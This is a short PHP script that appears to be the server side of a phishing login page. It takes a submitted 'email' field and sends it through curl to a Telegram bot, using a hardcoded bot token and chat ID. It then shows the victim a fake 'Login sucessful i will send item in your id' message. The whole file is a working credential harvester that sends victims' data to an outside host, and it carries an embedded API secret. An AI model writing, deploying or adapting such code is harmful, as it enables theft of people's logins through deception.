<?php
if(isset($_POST['submit'])){
    $text = $_POST['email'];
    $chat_id ='1773053498';
    $token='2124650176:AAEiOoea1tcNfYTMJAithD8VxRoD8cPSYno';
    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    $result=curl_exec($ch);
    curl_close($ch);
    $result=json_decode($result,true);
    if(isset($result['ok'])){
        if(isset($result['result'])){
            echo "Login sucessful i will send item in your id";
        }else{
            echo $result['description'];
        }
}else{
    echo "Something went wrong";
}
}
?>



